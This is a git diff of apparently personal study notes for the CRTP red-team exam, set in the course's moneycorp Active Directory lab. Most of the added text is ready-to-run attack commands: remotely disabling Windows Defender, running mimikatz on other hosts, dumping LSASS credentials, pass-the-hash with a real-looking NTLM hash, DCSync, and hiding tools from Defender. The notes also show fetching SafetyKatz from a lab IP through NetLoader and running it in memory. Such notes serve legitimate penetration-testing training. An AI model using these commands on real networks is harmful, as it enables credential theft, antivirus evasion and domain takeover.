@@ -1,6 +1,37 @@
 # CRTP One Week Challenge
 #Main Notes
-Initial Access > Local PrivEsc > mimikatz > latral movement > mimikatz with new user
+### Things to keep in mind during the exam
+```
+#Learing Objective 1
+Enumerate Users
+Enumerate Computers
+Enumerate Domain Administrator
+Enumerate Enterprise Administrator
+
+#Learing Objective 2
+List all the OUs
+List all the computers in the StudentMachines OU
+List the GPOs
+Enumerate GPO applied on the StudentMachines OU
+
+#Learing Objective 3
+Enumerate ACL for the Domain Admins group
+Enumerate all modified rights/permissions for the students
+
+#Learing Objective 4
+Enumerate all domains in the moneycorp.lcoal forest
+Map the trusts of the dollarcorp.moneycorp.lcoal domain
+Map external trusts in moneycorp.localforest
+Identify external trusts of dollarcorp domain
+
+#Learing Objective 5
+elevate privilege to local administrator
+Identify a machine in the domain where you have local administrative access
+Using privileges of a user get DC
+
+#Learing Objective 6
+use BloodHound to identify the shortest path to Domain Admins in the dollarcorp admin
+```
 ### Load InviShell to avoid any enhanced login locally
 ```
 C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
@@ -1654,14 +1685,23 @@ sudo bloodhound   (credentials neo4j:to0or)
 ```
 
 # Lateral Movement - PowerShell Remoting
-Avoid using psexec as it is too noisy. instead use `"Enter-PSSession"` need Admin Privs
+Avoid using psexec as it is too noisy. instead, use `"Enter-PSSession"` need Admin Privs
 ```
 Enter-PSSession -ComputerName <dcorp-adminsrv>
 ```
 ### Execute commands or scriptblocks on another machine
 ```
-Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}   #check who you are
+Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami}   #check who you are
+Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -command {whoami}   #check who you are
 Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}   #Disable win defender
+```
+### File execution using ScriptBlock
+```
+Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock{"C:\temp\mimikatz.exe"}
+```
+File execution using FilePath
+```
+Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath "C:\temp\mimikatz.exe"
 ```
 ### Execute locally loaded function on another machine
 ```
@@ -1673,26 +1713,64 @@ Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock 
 ```
 Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -FilePath C:\scripts\Get-PassHahes.ps1   #check who you are
 ```
-### connect to different machines using winrs
+### Connect to different machines using winrs
 ```
 winrs -r:dcorp-adminsrv cmd
 winrs -remote:server1 -u:server1\administrator -p:Pass@123 hostname
 ```
 
-
-
-# Mimikatz
-### Dump Creds from memory admin privilege is required
+# Lateral Movement - Mimikatz
+### SafetyKatz.exe
+use SafetyKatz to minidump of lsass and PELoader to run Mimikatz
+```
+SafetyKatz.exe "sekurlsa::ekeys"
+```
+### Dump Creds from LSASS process. admin privilege is required
 ```
 privilege::debug | token::elevate | sekurlsa::logonpasswords
+```
+### Dump Creds on a local 
+```
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
 ### run powrshell using NTLM hash of a user
 ```
 sekurlsa::pth /user:svcadmin /ntlm:b38ff50264b74508085d82c69794a4d8 /domain:dollarcorp.moneycorp.local /run:powershell.exe
 ```
+### Over Pass the Hash (OPTH)
+pth: you are using NTLM and targeting local accounts
 
+opth: you are using NTLM or AES. we create a request or ticket from the DC.
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
+```
+### DCSync
+Extract credentials from the DC without code execution on it. Domain Admin privs are required to run DCSync
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\raman"'
+safetyKatz.exe "lsadump::dcsync /user:us\kebtgt" "exit"
+```
 
+# Offensive .NET
+3 Steps are there. check using DefenderCheck if your payload will be detected > if yes you need to obfuscate it using Invoke-Obfuscation or ConfuserEx to obfuscate the binary > Delivery of your payload using NetLoader
+### DefenderCheck 
+used to identify code and strings from a binary that Windows Defender may flag   #https://github.com/matterpreter/DefenderCheck
+```
+DefenderCheck.exe <path to code or tool>
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/34d03437-a36f-403f-8f34-5d15bacedda1)
 
+as we can see Windows Defender detected the string Credentials. simple you can change it to Creds to bypass Windows Defender. OR use ConfuserEX to obfuscate the binary
+### NetLoader
+used to load binary from filepath or URL   #https://github.com/Flangvik/NetLoader
+```
+Loader.exe -path http://10.10.16.10/safetykatz.exe
+```
 
-
-
+### AssemblyLoad.exe
+used to load the NetLoader in memory from a URL which then loads a binary from a filepath or URL
+```
+AssemblyLoad.exe
+http://10.10.16.10/Loader.exe -path http://10.10.16.11/SafetyKatz.exe
+```
